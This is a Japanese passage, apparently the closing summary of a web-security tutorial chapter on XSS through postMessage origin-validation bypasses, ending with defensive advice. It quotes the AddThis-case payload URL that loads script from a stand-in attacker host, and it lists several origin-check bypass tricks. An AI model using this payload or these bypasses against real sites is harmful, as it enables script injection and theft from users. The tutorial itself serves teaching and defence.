- **AddThis事例（2016, 100万サイト）** は、オリジン検証を「HTTP/HTTPSであること」だけに省略した結果、`at-share-bookmarklet://ATTACKERDOMAIN/xss.js` 一撃で全サイトがXSS可能になった、第三者スクリプトの怖さの象徴。
- オリジン検証バイパスは、`indexOf`の部分一致、`search()`/正規表現の `.` ワイルドカード、`startsWith`/`endsWith` の境界無視、サンドボックスiframeの `null` オリジン、iframe削除による `e.source` の `null` 化、`File`/`Error` を使った `escapeHtml` 回避——いずれも**言語仕様やブラウザ挙動の意味論のズレ**を突いている。
- 高度な実戦では、**プロトタイプ汚染（`__proto__` 注入）** や **CSPの `unsafe-eval`** と連鎖してXSSに到達する。
- 防御の核心は「**受信側で完全一致の許可リストによるオリジン検証＋データ形式検証＋危険なsink回避**」。サニタイザに頼る場合はバージョン依存の回避手法に注意する。

---

（前章: [第2章 コンテキストとペイロード](./02-context-payloads.md)　｜　次章: [第4章 高度なXSS](./04-advanced.md)　｜　[目次](./README.md)）
